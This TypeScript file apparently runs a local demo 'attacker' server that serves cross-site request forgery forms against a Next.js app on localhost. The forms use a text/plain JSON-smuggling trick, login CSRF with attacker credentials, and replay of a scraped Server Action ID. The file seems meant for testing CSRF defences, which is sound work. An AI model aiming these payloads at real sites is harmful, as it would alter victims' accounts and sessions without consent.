import { createServer } from 'node:http';

// Different site from the Next.js app on localhost:3000
const pages: Record<string, string> = {
  '/csrf-account': `<!doctype html>
<title>Cross-site account change</title>
<form action="http://localhost:3000/csrf-account" method="POST" enctype="text/plain">
  <input type="hidden" name='{"displayName":"Changed by cross-site form","padding":"' value='"}'>
  <button>Submit cross-site change</button>
</form>`,
  '/login': `<!doctype html>
<title>Cross-site login</title>
<form action="http://localhost:3000/login" method="POST" enctype="text/plain">
  <input type="hidden" name='{"username":"attacker","password":"demo-password","padding":"' value='"}'>
  <button>Submit cross-site login</button>
</form>`,
};

createServer(async (request, response) => {
  response.writeHead(200, { 'Content-Type': 'text/html' });

  if (request.url === '/server-action-login') {
    // Copy the public Server Action ID from the login page HTML
    const html = await (await fetch('http://localhost:3000/server-action-login')).text();
    const actionIdInput = html.match(/<input type="hidden" name="\$ACTION_ID_[^"]+"\/>/)![0];

    response.end(`<!doctype html>
<title>Cross-site Server Action login</title>
<form action="http://localhost:3000/server-action-login" method="POST" enctype="multipart/form-data">
  ${actionIdInput}
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="password" value="demo-password">
  <button>Submit cross-site Server Action login</button>
</form>`);
    return;
  }

  response.end(pages[request.url!]);
}).listen(3001, '127.0.0.1', () => {
  console.log(
    'Attacker pages: http://127.0.0.1:3001/csrf-account, http://127.0.0.1:3001/login, http://127.0.0.1:3001/server-action-login',
  );
});
